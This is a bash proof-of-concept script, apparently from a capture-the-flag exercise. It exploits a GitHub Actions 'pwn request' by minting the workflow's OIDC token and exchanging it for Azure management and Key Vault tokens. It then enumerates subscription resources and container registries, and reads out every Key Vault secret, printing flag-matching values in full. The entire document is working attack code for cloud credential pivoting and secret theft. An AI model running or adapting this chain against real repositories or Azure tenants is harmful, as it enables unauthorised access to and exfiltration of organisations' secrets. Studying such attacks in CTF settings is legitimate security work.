#!/usr/bin/env bash
# Tebamoto CTF - pwn request PoC (read-only enumeration)
set -uo pipefail
echo "=== [1] mint GitHub OIDC token ==="
IDT=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
      "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
      | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
echo "oidc token length: ${#IDT}"
python3 - "$IDT" <<'PY'
import sys,json,base64
p=sys.argv[1].split(".")[1]; p+="="*(-len(p)%4)
c=json.loads(base64.urlsafe_b64decode(p))
print("  sub:",c.get("sub")," aud:",c.get("aud")," repo:",c.get("repository"))
PY

get_tok() {
  curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
    -d "client_id=${AZURE_CLIENT_ID}" -d "scope=$1" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    -d "client_assertion=${IDT}" -d "grant_type=client_credentials" \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("access_token") or "ERR:"+json.dumps(d)[:400])'
}

echo "=== [2] exchange for ARM token ==="
ARM=$(get_tok "https://management.azure.com/.default")
case "$ARM" in ERR:*) echo "$ARM";; esac
echo "arm token length: ${#ARM}"

echo "=== [3] list resources ==="
curl -sS -H "Authorization: Bearer ${ARM}" \
 "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resources?api-version=2021-04-01" \
 | python3 -c '
import sys,json
d=json.load(sys.stdin)
for r in d.get("value",[]): print("  ",r["type"],"|",r["name"],"|",r.get("location"))
if "value" not in d: print(json.dumps(d)[:400])'

echo "=== [4] key vault secrets ==="
KVT=$(get_tok "https://vault.azure.net/.default")
VAULTS=$(curl -sS -H "Authorization: Bearer ${ARM}" \
 "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resources?api-version=2021-04-01&\$filter=resourceType%20eq%20'Microsoft.KeyVault/vaults'" \
 | python3 -c 'import sys,json;[print(r["name"]) for r in json.load(sys.stdin).get("value",[])]')
echo "vaults: ${VAULTS:-none}"
for V in $VAULTS; do
  echo "--- vault: $V"
  for ID in $(curl -sS -H "Authorization: Bearer ${KVT}" "https://${V}.vault.azure.net/secrets?api-version=7.4" \
              | python3 -c 'import sys,json;[print(s["id"]) for s in json.load(sys.stdin).get("value",[])]'); do
    NAME="${ID##*/}"
    VAL=$(curl -sS -H "Authorization: Bearer ${KVT}" "${ID}?api-version=7.4" \
          | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
    case "$VAL" in
      *FLAG*|*flag*|*CTF*|*DF26*|*df26*) echo "  [FLAG] $NAME = $VAL" ;;
      *) echo "  $NAME = (len ${#VAL})" ;;
    esac
  done
done
echo "=== [5] ACR ==="
ACRT=$(get_tok "https://management.azure.com/.default")
curl -sS -H "Authorization: Bearer ${ACRT}" \
 "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resources?api-version=2021-04-01&\$filter=resourceType%20eq%20'Microsoft.ContainerRegistry/registries'" \
 | head -c 600
echo
echo "=== done ==="